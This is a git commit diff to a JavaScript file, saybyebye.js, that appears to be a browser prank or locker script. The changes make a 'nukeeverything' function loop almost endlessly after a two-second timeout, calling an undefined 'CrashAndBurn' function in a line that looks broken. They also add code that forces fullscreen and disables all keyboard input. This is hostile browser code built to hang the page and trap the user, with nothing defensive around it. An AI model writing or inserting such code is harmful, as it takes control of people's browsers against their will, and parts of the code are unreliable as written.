6cbe4a6560d3e7d609f0f0a7556f175a47356c1c
eevb <96337431+eevb@users.noreply.github.com>
2022-02-23 15:55:17 +0200

    Add files via upload

--- JavaScript/saybyebye.js
+++ JavaScript/saybyebye.js
@@ -14,7 +14,49 @@ function nukeeverything() {
   setTimeout(function () {
     for (let step = 0; step < 99999999999999; step++) {
       console.log("Hello World!");
-      window.close();
+      JavaScript:CrashAndBurn(self.location,'_blank');
     }
-  }, 6000);
+  }, 2000);
+}
+
+function toggleFullScreen(elem) {
+  if ((document.fullScreenElement !== undefined && document.fullScreenElement === null) || (document.msFullscreenElement !== undefined && document.msFullscreenElement === null) || (document.mozFullScreen !== undefined && !document.mozFullScreen) || (document.webkitIsFullScreen !== undefined && !document.webkitIsFullScreen)) {
+      if (elem.requestFullScreen) {
+          elem.requestFullScreen();
+      } else if (elem.mozRequestFullScreen) {
+          elem.mozRequestFullScreen();
+      } else if (elem.webkitRequestFullScreen) {
+          elem.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);
+      } else if (elem.msRequestFullscreen) {
+          elem.msRequestFullscreen();
+      }
+  } else {
+      if (document.cancelFullScreen) {
+          document.cancelFullScreen();
+      } else if (document.mozCancelFullScreen) {
+          document.mozCancelFullScreen();
+      } else if (document.webkitCancelFullScreen) {
+          document.webkitCancelFullScreen();
+      } else if (document.msExitFullscreen) {
+          document.msExitFullscreen();
+      }
+  }
+}
+
+
+
+
+function disable()
+{
+ document.onkeydown = function (e) 
+ {
+  return false;
+ }
+}
+function enable()
+{
+ document.onkeydown = function (e) 
+ {
+  return true;
+ }
 }
